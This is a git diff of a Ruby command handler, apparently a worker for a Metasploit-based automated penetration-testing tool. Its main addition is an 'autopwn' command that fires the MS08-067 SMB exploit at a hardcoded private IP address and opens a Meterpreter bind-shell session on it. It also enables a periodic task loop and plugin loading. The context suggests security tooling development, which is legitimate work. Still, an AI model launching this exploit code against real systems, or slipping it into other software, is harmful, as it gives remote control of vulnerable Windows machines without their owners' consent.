@@ -21,10 +21,7 @@ class CommandHandler
 
     handler = MsfSessionEvent.new
     @framework.events.add_session_subscriber(handler)
-
-    manager = SubnetManager.new @framework, "10.20.20.1"
-    manager.get_sessions
-    #load_plugins
+    load_plugins
   end
   
   def parse_command _cmd
@@ -46,10 +43,19 @@ class CommandHandler
   end
   
   def cmd_autopwn args
-    puts "msf-workerinstance subnet manager"
-    manager = SubnetManager.new @framework, args[0]
-    puts "msf-worker:get sessions"
-    manager.get_sessions
+    # does not work anymore ? 
+    #manager = SubnetManager.new @framework, args[0]
+    #manager.get_sessions
+
+    exploit = @framework.exploits.create("windows/smb/ms08_067_netapi")
+    exploit.datastore['RHOST'] = "192.168.178.34"
+    input        = Rex::Ui::Text::Input::Stdio.new
+    output       = Rex::Ui::Text::Output::Stdio.new
+  	session = exploit.exploit_simple(
+		'Payload'     => "windows/meterpreter/bind_tcp",
+		'LocalInput'  => input,
+		'LocalOutput' => output)
+
   end
   
   def cmd_nmap args
@@ -107,7 +113,7 @@ class CommandHandler
       begin
         task.progress = 1
         task.save
-
+        Msf::Plugin::FidiusLogger.task_id = task.id
         parse_command task.module
 
         task.progress = 100
@@ -132,6 +138,6 @@ end
 
 $command_handler = CommandHandler.new
 
-#EM.run do
-#  EventMachine::add_periodic_timer 10, proc{$command_handler.tasks_loop}
-#end
+EM.run do
+  EventMachine::add_periodic_timer 10, proc{$command_handler.tasks_loop}
+end
